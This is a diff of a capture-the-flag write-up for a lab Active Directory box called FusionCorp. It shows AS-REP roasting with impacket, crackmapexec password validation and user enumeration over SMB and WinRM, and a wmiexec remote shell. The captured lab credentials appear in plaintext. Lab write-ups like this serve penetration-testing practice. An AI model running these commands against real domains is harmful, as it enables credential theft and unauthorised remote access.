@@ -183,7 +183,7 @@ Created a file with the <code>usernames</code> --> <code>usernames.txt</code></p
 <br>
 
 ```bash
-~/FusionCorp# python3 /opt/impacket/build/scripts-3.9/GetNPUsers.py fusion.corp/ -usersfile usernames.txt -dc-ip TargetIP -outputfile Hash -request
+~/FusionCorp# python3 /opt/impacket/build/scripts-3.8/GetNPUsers.py fusion.corp/ -usersfile usernames.txt -dc-ip Target -outputfile Hash -request
 Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 
 :~/FusionCorp# ls
@@ -216,6 +216,68 @@ Confirmed <code>Kerberos</code>´ <code>lparker@FUSION.CORP</code>;</p>
 
 <br>
 
+<h2 align="center">crackmapexec</h2>
+<p>Installed <code>crackmapexec</code> and used it to </p>
+
+<br>
+
+```bash
+:~/FusionCorp# snap install crackmapexec
+...
+:~/FusionCorp# crackmapexec smb TargetIP -u lparker -p '!!abbylvzsvs2k6!'
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder protocols
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Copying default configuration file
+SMB         TargetIP   445    FUSION-DC        [*] Windows 10.0 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
+SMB         TargetIP   445    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! 
+:~/FusionCorp#
+:~/FusionCorp#
+:~/FusionCorp#
+:~/FusionCorp# crackmapexec smb TargetIP -u lparker -p '!!abbylvzsvs2k6!' --users
+SMB         TargetIP   445    FUSION-DC        [*] Windows 10.0 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
+SMB         TargetIP   445    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! 
+SMB         TargetIP   445    FUSION-DC        [*] Trying to dump local users with SAMRPC protocol
+SMB         TargetIP   445    FUSION-DC        [+] Enumerated domain user(s)
+SMB         TargetIP   445    FUSION-DC        fusion.corp\Administrator                  Built-in account for administering the computer/domain
+SMB         TargetIP   445    FUSION-DC        fusion.corp\Guest                          Built-in account for guest access to the computer/domain
+SMB         TargetIP   445    FUSION-DC        fusion.corp\krbtgt                         Key Distribution Center Service Account
+SMB         TargetIP   445    FUSION-DC        fusion.corp\lparker                        
+SMB         TargetIP   445    FUSION-DC        fusion.corp\jmurphy                        Password set to u8WC3!kLsgw=#bRY
+:~/FusionCorp#
+:~/FusionCorp#
+:~/FusionCorp# crackmapexec smb TargetIP -u lparker -p '!!abbylvzsvs2k6!' --groups
+SMB         TargetIP   445    FUSION-DC        [*] Windows 10.0 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
+SMB         TargetIP   445    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! 
+SMB         TargetIP   445    FUSION-DC        [-] Error enumerating domain group using dc ip TargetIP: unsupported hash type MD4
+:~/FusionCorp# crackmapexec winrm TargetIP -u lparker -p '!!abbylvzsvs2k6!'
+SMB         TargetIP   5985   FUSION-DC        [*] Windows 10.0 Build 17763 (name:FUSION-DC) (domain:fusion.corp)
+HTTP        TargetIP   5985   FUSION-DC        [*] http://TargetIP:5985/wsman
+HTTP        TargetIP   5985   FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! (Pwn3d!)
+root@ip-10-10-250-201:~/FusionCorp# 
+
+
+```
+
+<br>
+
+
+<h2 align="center">wmiexec</h2>
+<p>- <code>wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/wmiexec.py</code><br>
+- <code>chmod +x wmiexec.py</code><br>
+- <code>wmiexec.py -k -no-pass lparker@FUSION.CORP</code><br>
+- Got the shell</p>
+
+<br>
+
+<br>
+
+
 <br>
 
 <h2 align="center">kerbrute</h2>
@@ -242,28 +304,6 @@ Downloaded it from here --> https://github.com/ropnop/kerbrute/releases/download
 
 <br>
 
-<br>
-
-<h2 align="center">crackmapexec</h2>
-<p>Installed <code>crackmapexec</code> and used it to </p>
-
-<br>
-
-```bash
-:~/FusionCorp# snap install crackmapexec
-
-<br>
-
-<h2 align="center">wmiexec</h2>
-<p>- <code>wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/wmiexec.py</code><br>
-- <code>chmod +x wmiexec.py</code><br>
-- <code>wmiexec.py -k -no-pass lparker@FUSION.CORP</code><br>
-- Got the shell</p>
-
-<br>
-
-<br>
-
 
 <h2 align="center">Domain users details</h2>
 
@@ -278,6 +318,8 @@ Downloaded it from here --> https://github.com/ropnop/kerbrute/releases/download
 
 <br>
 
+
+<h1>To be continued ...</h1>
 
 
 <h2 align="center">http://TargetIP</h2>
